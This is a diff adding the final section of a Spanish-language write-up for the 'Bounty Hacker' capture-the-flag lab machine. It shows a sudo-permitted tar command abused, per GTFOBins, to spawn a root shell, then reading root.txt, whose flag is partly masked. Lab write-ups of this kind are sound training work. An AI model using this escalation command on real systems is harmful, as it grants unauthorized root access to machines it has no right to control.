@@ -189,5 +189,35 @@ User lin may run the following commands on bountyhacker:
 
 Como vemos tiene como privilegios de root la aplicación de **tar** con lo cual vamos a la pagina [GTFOBINS](https://gtfobins.github.io/gtfobins/tar/), con lo cual nos va decir como podemos entrar como **root** con el programa **tar**.
 
+**SALIDA DEL COMANDO**
+```bash
+##n@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# cd / 
+# ls
+bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
+boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
+cdrom  home  lib             media       proc  sbin  sys   var
+```
 
+Ahora vamos a la carpeta de **root** en el cual tiene la ultima bandera, con lo cual vamos usar el comando **ls**, para leer el fichero que tiene en el.
 
+```bash
+# cd root
+# ls 
+root.txt
+# cat root.txt
+THM{80########3r}
+```
+
+### PREGUNTAS SOBRE LO ENCONTRADO
+
+- root.txt
+
+```bash
+THM{80########3r}
+```
+
+Y Con todo los pasos realizado hemos ya hemos terminado la maquina.
+
+![TERMINADO](/assets/img/HACKER_ETICO/COWBOYHACKER/TERMINADO.png)
